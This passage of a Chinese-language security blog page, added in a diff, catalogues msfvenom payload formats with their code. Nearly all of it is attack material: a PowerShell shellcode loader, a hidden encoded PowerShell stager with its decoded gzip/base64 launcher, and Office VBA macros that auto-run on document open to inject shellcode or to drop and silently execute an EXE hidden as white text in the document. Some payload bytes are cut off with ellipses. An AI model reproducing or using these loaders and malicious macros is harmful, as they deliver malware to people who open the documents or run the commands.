+[System.Runtime.InteropServices.Marshal]::Copy($cb, 0, $srf, $cb.length)
+
+$uC = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((hh kernel32.dll CreateThread), (rW @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$srf,[IntPtr]::Zero,0,[IntPtr]::Zero)
+[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((hh kernel32.dll WaitForSingleObject), (rW @([IntPtr], [Int32]))).Invoke($uC,0xffffffff) | Out-Null
+</code></pre>
+
+<h2 id="pshcmd">psh-cmd</h2>
+
+<p>使用 <code>powershell -enc</code> 一键执行, 实质为将 shellcode 加载至内存, 然后创建进程.</p>
+
+<pre><code>%COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewAkAGIAPQAnAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQAnAH0AZQBsAHMAZQB7ACQAYgA9ACQAZQBuAHYAOgB3AGkAbgBkAGkAcgArA
+......
+</code></pre>
+
+<p>解码后的内容.</p>
+
+<pre><code>if([IntPtr]::Size -eq 4 {
+    $b='powershell.exe'
+} else {
+    $b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'
+};
+$s=New-Object System.Diagnostics.ProcessStartInfo;
+$s.FileName=$b;
+$s.Arguments='-nop -w hidden -c &amp;([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(''H4sIAMGUPl0CA7VWbW/aSBD+nEj5D1aFhK0QDIEmTaRKt+ad4sTEgUAoOm3stb2wtsl6DYG2//3G2E7Ta3LXnnQWL/syMzvzzDOzduLAEjQMJDEYZsr......''))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';
+$s.UseShellExecute=$false;
+$s.RedirectStandardOutput=$true;
+$s.WindowStyle='Hidden';
+$s.CreateNoWindow=$true;
+$p=[System.Diagnostics.Process]::Start($s);
+</code></pre>
+
+<h2 id="vba">vba</h2>
+
+<p>调用 win32api 将 shellcode 加载至内存, 然后创建进程.</p>
+
+<pre><code>#If Vba7 Then
+    Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal Dqarj As Long, ByVal Ugoinxes As Long, ByVal Rnynjmirt As LongPtr, Voc As Long, ByVal Ehoghklrh As Long, Ybsykabhv As Long) As LongPtr
+    Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal Uzi As Long, ByVal Rfewcsbud As Long, ByVal Xdydsi As Long, ByVal Ranjbjyup As Long) As LongPtr
+    Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal Foz As LongPtr, ByRef Jwgy As Any, ByVal Ave As Long) As LongPtr
+#Else
+    Private Declare Function CreateThread Lib "kernel32" (ByVal Dqarj As Long, ByVal Ugoinxes As Long, ByVal Rnynjmirt As Long, Voc As Long, ByVal Ehoghklrh As Long, Ybsykabhv As Long) As Long
+    Private Declare Function VirtualAlloc Lib "kernel32" (ByVal Uzi As Long, ByVal Rfewcsbud As Long, ByVal Xdydsi As Long, ByVal Ranjbjyup As Long) As Long
+    Private Declare Function RtlMoveMemory Lib "kernel32" (ByVal Foz As Long, ByRef Jwgy As Any, ByVal Ave As Long) As Long
+#EndIf
+
+Sub Auto_Open()
+    Dim Pkwkdexzr As Long, Mcpo As Variant, Cggw As Long
+#If Vba7 Then
+    Dim  Ekfzpnfyt As LongPtr, Udtzjekhw As LongPtr
+#Else
+    Dim  Ekfzpnfyt As Long, Udtzjekhw As Long
+#EndIf
+    Mcpo = Array(232,130,0,0,0,96,137,229,49,192,100,139,80,48,139,82,12,139,82,20,139,114,40,15,183......)
+
+    Ekfzpnfyt = VirtualAlloc(0, UBound(Mcpo), &amp;H1000, &amp;H40)
+    For Cggw = LBound(Mcpo) To UBound(Mcpo)
+        Pkwkdexzr = Mcpo(Cggw)
+        Udtzjekhw = RtlMoveMemory(Ekfzpnfyt + Cggw, Pkwkdexzr, 1)
+    Next Cggw
+    Udtzjekhw = CreateThread(0, 0, Ekfzpnfyt, 0, 0, 0)
+End Sub
+Sub AutoOpen()
+    Auto_Open
+End Sub
+Sub Workbook_Open()
+    Auto_Open
+End Sub
+</code></pre>
+
+<h2 id="vbaexe">vba-exe</h2>
+
+<p>分为 loader 和 shellcode 两部分, 运行时 loader 将从 doc 文档内容里获取 shellcode, 然后保存为 exe 执行.</p>
+
+<p>打开 doc 文档后将 payload 粘贴至文档末尾, 然后将字体颜色调为白色.</p>
+
+<p>如果显示红色下划线就把 loader 和 payload 里的定位符 (这里是 Hmnywqavfc) 改成常用的单词.</p>
+
+<pre><code>'**************************************************************
+'*
+'* This code is now split into two pieces:
+'*  1. The Macro. This must be copied into the Office document
+'*     macro editor. This macro will run on startup.
+'*
+'*  2. The Data. The hex dump at the end of this output must be
+'*     appended to the end of the document contents.
+'*
+'**************************************************************
+'*
+'* MACRO CODE
+'*
+'**************************************************************
+
+Sub Auto_Open()
+    Cseed12
+End Sub
+
+Sub Cseed12()
+    Dim Cseed7 As Integer
+    Dim Cseed1 As String
+    Dim Cseed2 As String
+    Dim Cseed3 As Integer
+    Dim Cseed4 As Paragraph
+    Dim Cseed8 As Integer
+    Dim Cseed9 As Boolean
+    Dim Cseed5 As Integer
+    Dim Cseed11 As String
+    Dim Cseed6 As Byte
+    Dim Hmnywqavfc as String
+    Hmnywqavfc = "Hmnywqavfc"
+    Cseed1 = "SqfibJKpmkMGwu.exe"
+    Cseed2 = Environ("USERPROFILE")
+    ChDrive (Cseed2)
+    ChDir (Cseed2)
+    Cseed3 = FreeFile()
+    Open Cseed1 For Binary As Cseed3
+    For Each Cseed4 in ActiveDocument.Paragraphs
+        DoEvents
+            Cseed11 = Cseed4.Range.Text
+        If (Cseed9 = True) Then
+            Cseed8 = 1
+            While (Cseed8 &lt; Len(Cseed11))
+                Cseed6 = Mid(Cseed11,Cseed8,4)
+                Put #Cseed3, , Cseed6
+                Cseed8 = Cseed8 + 4
+            Wend
+        ElseIf (InStr(1,Cseed11,Hmnywqavfc) &gt; 0 And Len(Cseed11) &gt; 0) Then
+            Cseed9 = True
+        End If
+    Next
+    Close #Cseed3
+    Cseed13(Cseed1)
+End Sub
+
+Sub Cseed13(Cseed10 As String)
+    Dim Cseed7 As Integer
+    Dim Cseed2 As String
+    Cseed2 = Environ("USERPROFILE")
+    ChDrive (Cseed2)
+    ChDir (Cseed2)
+    Cseed7 = Shell(Cseed10, vbHide)
+End Sub
+
+Sub AutoOpen()
+    Auto_Open
+End Sub
+
+Sub Workbook_Open()
+    Auto_Open
+End Sub
+
+'**************************************************************
+'*
+'* PAYLOAD DATA
+'*
+'**************************************************************
+
+Hmnywqavfc
+&amp;H4D&amp;H5A&amp;H90&amp;H00&amp;H03&amp;H00&amp;H00&amp;H00&amp;H04&amp;H00&amp;H00&amp;H00&amp;HFF&amp;HFF&amp;H00&amp;H00&amp;HB8&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H40&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00......
+</code></pre>
+
+<h2 id="vbapsh">vba-psh</h2>
+
+<p>调用 powershell 执行 shellcode.</p>
+
+<pre><code>Sub zfx88nq1O()
+  Dim neqc
+  neqc = "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewAkAGIAPQAnAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQAnAH0AZQBsAHMAZQB7ACQAYgA9ACQAZQBuAHYAOgB3AGkAbgBkAGkAcgArACcAXABzAHkAcwB3AG8AdwA2ADQAXABXAGkAbgBkAG8AdwBzAFAAbwB3A" _
+&amp; "GUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACcAfQA7ACQAcwA9AE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHMAUwB0AGEAcgB0AEkAbgBmAG8AOwAkAHMALgBGAGkAbABlAE4AYQBtAGUAPQAkAGIAOwAkAHMALgB" _
+&amp; "BAHIAZwB1AG0AZQBuAHQAcwA9ACcALQBuAG8AcAAgAC0AdwAgAGgAaQBkAGQAZQBuACAALQBjACAAJgAoAFsAcwBjAHIAaQBwAHQAYgBsAG8AYwBrAF0AOgA6AGMAcgBlAGEAdABlACgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkAGUAcgAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAI" _
+&amp; "ABTAHkAcwB0AGUAbQAuAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEcAegBpAHAAUwB0AHIAZQBhAG0AKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAFMAeQBzAHQAZQBtAC4AQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFM" _
+&amp; "AdAByAGkAbgBnACgAJwAnAEgANABzAEkAQQBCAFcAVwBQAGwAMABDAEEANwBWAFcAYgBXAC8AYQBTAEIARAArAG4ARQBqADUARAAxAGEARgBaAEYAcwBoAEcAQgBMAGEATgBKAEUAcQAzAFoAcAAzAGkAaABPAEkAZwBVAEEAbwBxAGoAYgAyADIAbAA2AHkAOQBvAEsAOQBEAG8ARgBlAC8ALwB2AE4AZwBwADIAbQAxADcAUgBxAFQAegBxAEwAbAAzA" _
+&amp; "DIAWgBtAFoAMQA1ADUAcABsAFoAZQAyAG4AawBDAE0AbwBqADUAWgA0ADMAbQBzAHEAWABvADgATwBEAFAAbwA1AHgAcQBHAGkARgA5AGEAbgBWADgANABwAEsAWQBWAEcALwBFAHQAZgA2AHcAUQBGAHMARgBaAEwAKwBaACsAVwBEAG8AcwAzAFEAYwBsAG4AbgBJAGEAYgBSAC8AUABLAHkAbABzAFkAeABpAGMAUgArAFgAbQBvAFIAZwBaAEsARQB" _
+&amp; "oAFAAZQBNAGsAawBUAFQAbABiACsAVgAyADQARABFADUATwBUADYAZgBrAEUAYwBvAFgAeABSAEMAcAA5AEwATABjAGIAdgBNAGMAdgBFAE4AagBYAHMAQgBFAFEANQBRAFoARQByADkAMwByAGMAdwBkAEsAZgBrAHIAMQBrAFYARwBqAHEAcAAwACsAcQBQAGoAdQBwAHoARQB1AE4AVgBZAHAAWgBvAHEAbgAyAEoAaABFAGsATABMAG0ATQBxAGIAc" _
+&amp; "gB5AFYAWgBjAEgARABqAGQATABvAHEAawBXAGQAVwBLAGUAYwBFACsAVQBiAG0AbAAwAGQAbABvAGEAUgBRAG4AMgB5AEIAVgBZAGUAeQBRAFcARQBRAEYAMwBFADEAVwBIAEkATwBBAFQARQA1AEgARwBrAFMATABEAGsAZgByADcAWABVADIARgBZAFQALwBtAEQAbgBMAGQAbQBDAFMASgBXAGwAUgBtADAAdgBKAHMAUAB2ADkATABtADIAWABIADM" _
+&amp; "AcQBTAFIAbwBDAEUAcABkAFMASgBCAFkAcgA2ADAAUwBmAHgASQBIAFoASwBVADIAagBoAHkARwBiAGsAaAAzAGgAeQAwAGIAQgBIAFQAeQBKAC8AcgBPAG8AZwA5ADgAZwBlAGkARgBhAEsAVQBzAGEATAB5AEoAMgBhADAASwA3AEwATwBRAGYAdABkAEoAZQAyAGwARQBrAGoAMQBSAGEAdwBYAEkAWgBNAC8AaABtAGwAeABOADIAVgBrAHIANgBpA" _
+&amp; "CsANAB1AGMAKwArAFQAbwA4AHoAdwBRAEEANgBMADQAZQBIAFIANABkAGUAagBsAGgAMQBxAE8AWABkAEkASABSAHcAVwB3ADMASgB1AEMAZAAxAHUAYwBKADMAVQBsADkAVQBNAHAARgB4AFkASwBEAHMATwBEAHgAQgBxAGEARgBZAFoAdwBTAGYAZgA2AE0AcgBWAEwAdwB5AHMAVwBmAGEAMQBkAHkAVQBSAEQARQBnAC8AbwBZAGwAbQBaAGoAVAB" _
+&amp; "0ADAANQBxAEcAVABaAEwAQQBUAGoAbwBWAHoAKwBPAFMAbgByAHgASwBNAFIAcQBXADgAaQBIAEYASQBuADUANQAzADIARwBzAFQARQBZADIAUQBYAFgAaQBrAFgAdQB3AEsAZgBOAEQAWABiAEkARwA2AGQATQBPAEoAagBJAFYARwBUAG0AZgA1AEIAcgBSAEYAUwA4AGEAeAByAHAAcABTADUASgBFAFkATwBwAEMAawBCAHIAeQBDAEQAKwB2AGYAT" _
+&amp; "wA3AEIATwBoAHEAWgAzAEkASQBpAEUAQQB0AEoAOABEADkAUQBvAGUAcwBKADMAawAwAGgAbgBEAE4ALwBuAHAAYwBnADUAQwBhAG8AMwBoAEoAQwBrAHEALwBSAFQASwB6AFMAawBxAE4AcwBHAE0AdQBFAFUARgBSAFEAbgBOAHQAbABBAHEAKwBHADYAbwBmAG4AUABYAFMAcABtAGcARABrADUARQBiAG0ANgB1AFoAegBCAG0AeAA5AFYANABsAEk" _
+&amp; "AZwA0AGQAUwBCAGwARQBQAHIAUQBYAGgASwBIAFkAaQBhAFIASwBDAHAAdAA2AGgASgB6AFkAMQBNAC8AUAAxAFoAOQBGAFkAYwBhAFoAZwB5AEsAQQBDAHcAOQBRAGgANQBnAFIAYwBaAHYAQwAwAG0ARQAyAEoAWABoAGwAZgBXAFMAVABVAFEAbgBYAEQASQBTAGcAcwBTAHUANgBKAHMATQArADEARABpAEcAZABGADMAdgBNAEUAKwBjAGQAVgAvA" _
+&amp; "HUAWgBjAFQAZQBjADkAYQBpAFUATQBPAHcAQQB2AG4ASQBMAGsAMgA0ADYASwBvAGoARwBrAHMAbwBIAFYASQBUAEMAVwBCAC8AcwB2AFoATAAxAHEARwA5AEsASQBXAGsAeQB3AEgAVwBsADQAVgBNADMATQBqAEoASgBzAEwAZgBEAFAAcABTAGoASgBtAGkATwB6AGkAagB3AFgARQAzAG8AeAA1AGEATwBLAEUAdgBLAHYAdQAyADQAUAAyAHgAcgB" _
+&amp; "pAG0ATgBRAFQAUAB0AEIATQB4AHkAegBFAGYAYQBBAFcAdABhAGEAVgBqAHcAWABkAEUAegB6AHEAOABmAHUANQArADcAQwA3AGEAUgBsAHgALwBDAGoAegBVAFMAVABwAFcAdQAxADgAZgB0AE4AdgBWAHgANgA0ADkAcgBnAHEANwAwAFIARQBmACsAeAAxAGgATgBTAGEATABoAFkAMwBhAE4ANgBPAHAAdQBPAHUAZwA5AHAAQwBXAEgANgBiAFYAN" _
+&amp; "wBiAEoATAB0ADMAWQBQAHUAZABNAG4ANAA5ADMAVwAzAEsANwBMADUAdABOADIANABiAHYAZQB0AE8ANQA1AC8AcgBsAG4AMwAxAFQAZQBOAG0AbgB2AHQAagBZAHcAeQA2AGUANABWADIAKwBrAHYAVgB0AHoAYgBaAGEAcgBTAFkATwB1ADIAdwBNADYARwBqAHgAMABtACsASgArAE8AbQBaADQANQBCAG4AKwBwAEgASwBCADYAVgBNAHYAWABvAHc" _
+&amp; "AcgAzAE4AcAAyAEUARwBvAEYAWgA4ADYAMgA2ADQAMQBiAGcAZQBWAHUAcABtADEASwBGAGsAYQA1AFIAdwBkAG8AZwBOAEIASAA1ADIAWQAwAGEAdgBsAEwAdgA1AFUAZwA0ADIASwA4AHEAbwBVAEwAdABFAEkATgBFADYATQBPAGEAbwB3ADMAMwBiAGYATQBIAEkAeQBhAEoAaABvADEAegBBAEcAKwA1AHYAMgB6ADQANwBwAFIAdQBYAE4AWABqA" _
+&amp; "GUAYgBkAEIASABkAEQANQByAGIAYQBSAG0AVQA2AFEAUwA2AEsAagBhAEUAZgBWAE0ANgB2AGcAMABqAGkAaABIADEAegBaAFUAbwBaADEATAB2AGIATgBBADIAUQA2AFYAZABSAHUAMwBwAEsAdAAzAGUAcgBRAGMAdABIAEQAWgBBAFoAaAB4AHoAaABKAG4AMABZAEgAVQAvAEEANQB0AFUAUQBkAEcANQBIAEYAWgBjAGoARQBYAFUAbQBoAGoASAA" _
+&amp; "yAEQAUgA5ADUAZABqAEQARgB5AEEAUgBwAGMANABXAGEASgBxADkAdAAzAHYAZQB0AHYAagBFAGUAbgB3AGEAVgArADQAZABLAEEARAA2AFQAeQBlAE4ANwBxADQAdQBPAG0AMAA3AGYATQBJAHoAagA4AEIANQArAEQAZQBSAFkAeQA2AGQAbwBZAHEANwBQAEgAOQBjAEMAZAAyAC8AQgA5AHQAQwA0AEcASAAxADQASQB5AGsAQwBIAEMAbQBzAEwAb" _
+&amp; "AA1AGsALwBtAGYAZAAyAHMASgB4AEUAbQBBAEcAagBJAEEAKwBuAEIAZABnAGsAOABmAE4AcgBLAC8AMgBPAFoAVQBhAG0AcgBhADcAawBCADkASQBIAEIARQBHAHQAeABuAGMAZAB6AG0AVABFAFcAUABjAGsAWQAwAGQATwBqAEIAYwBLAGYAdABHAEwAKwArAGQARQBRAHoAUABUAGwAOABkADYAYwBxAHoAbwBQADYAdAAzACsAZABMAGwANQBkADM" _
+&amp; "ANABDAE4AVQBoAG0AUgB2AHEAVQBjAGkAWAB3AFQARgA4AHQATgBaAHUAUQB6AE4AdQAvAHgAVQBMAFUATwBFAHYAeAA5AFgAagBTADgAMwAyAHMANQBVAFUAVABaAC8AZwBDAFcAMwB6AEgAYQBXAGQAVgBrAHcAQgBVADcALwBYADcAQwB5AEkAZwAzAGcAegAvADAAMQBXAE4ALwBXAGYAcgBIADcAVwB3AEMAVwBpAHoATABZAEgAeABhAC8AWAAvA" _
+&amp; "GcAagBMAFAAOAA0ADcARgB0AE0AQgBVAGoAYQAwAEcARQBZADIAVgA5AHUAcgAwAFcAZgBzAGUATABGADEAYwA4AHAAWgBOAHoATABIAHYAbgBlAGQAcAAyAEsAawB5AHQANABIAHoAZwA2AC8AQQBkADQAOQA0ADYATgBKAEEAbwBBAEEAQQA9AD0AJwAnACkAKQApACwAWwBTAHkAcwB0AGUAbQAuAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgA" _
+&amp; "uAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6AEQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACkALgBSAGUAYQBkAFQAbwBFAG4AZAAoACkAKQApACcAOwAkAHMALgBVAHMAZQBTAGgAZQBsAGwARQB4AGUAYwB1AHQAZQA9ACQAZgBhAGwAcwBlADsAJABzAC4AUgBlAGQAaQByAGUAYwB0AFMAdABhAG4AZABhAHIAZABPAHUAdABwAHUAd" _
+&amp; "AA9ACQAdAByAHUAZQA7ACQAcwAuAFcAaQBuAGQAbwB3AFMAdAB5AGwAZQA9ACcASABpAGQAZABlAG4AJwA7ACQAcwAuAEMAcgBlAGEAdABlAE4AbwBXAGkAbgBkAG8AdwA9ACQAdAByAHUAZQA7ACQAcAA9AFsAUwB5AHMAdABlAG0ALgBEAGkAYQBnAG4AbwBzAHQAaQBjAHMALgBQAHIAbwBjAGUAcwBzAF0AOgA6AFMAdABhAHIAdAAoACQAcwApADs" _
+&amp; "A"
+  Call Shell(neqc, vbHide)
+End Sub
+Sub AutoOpen()
+  zfx88nq1O
+End Sub
+Sub Workbook_Open()
+  zfx88nq1O
+End Sub
+</code></pre>
+<!-- content end -->
+</div>
+<br>
+<br>
+    <div id="disqus_thread"></div>
+	<div class="footer">
+		<p>© Copyright 2017-2019 by X1r0z</p>
+	</div>
+</div>
+<script src="main.js"></script>
+<script id="content" type="text/mustache">
+    <h1>{{title}}</h1>
+    <div class="tag">
+    {{date}}
+    {{#tags}}
+    <a href="/#/tag/{{name}}">#{{name}}</a>
+    {{/tags}}
+    </div>
+</script>
+<script id="pagesTemplate" type="text/mustache">
+    {{#pages}}
+    <li>
+        <a href="{{path}}">{{title}}</a>
+    </li>
+    {{/pages}}
+</script>
+<script>
+$(document).ready(function() {
+    $.ajax({
+        url: "main.json",
+        type: "GET",
+        dataType: "json",
+        success: function(data) {
+            $("#title").html(data.name);
+            var pagesTemplate = Hogan.compile($("#pagesTemplate").html());
+            var pagesHtml = pagesTemplate.render({"pages": data.pages});
+            $("#pages").append(pagesHtml);
+            //path
+            var path = "msfvenom-unusual-format.html";
+            //path end
+            var now = 0;
+            for (var i = 0; i < data.posts.length; ++i)
+                if (path == data.posts[i].path)
+                    now = i;
+            var post = data.posts[now];
+            var tmp = post.tags.split(" ");
+            var tags = [];
+            for (var i = 0; i < tmp.length; ++i)
+                if (tmp[i].length > 0)
+                    tags.push({"name": tmp[i]});
+            var contentTemplate = Hogan.compile($("#content").html());
+            var contentHtml = contentTemplate.render({"title": post.title, "tags": tags, "date": post.date});
+            $("#main").prepend(contentHtml);
+            if (data.disqus_shortname.length > 0) {
+                var disqus_shortname = data.disqus_shortname;
+                (function() {
+                    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+                    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+                    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+                })();
+            }
+        }
+    });
+});
+</script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$'], ["\\(", "\\)"]], processEscapes: true}});
+</script>
+</body>
+</html>
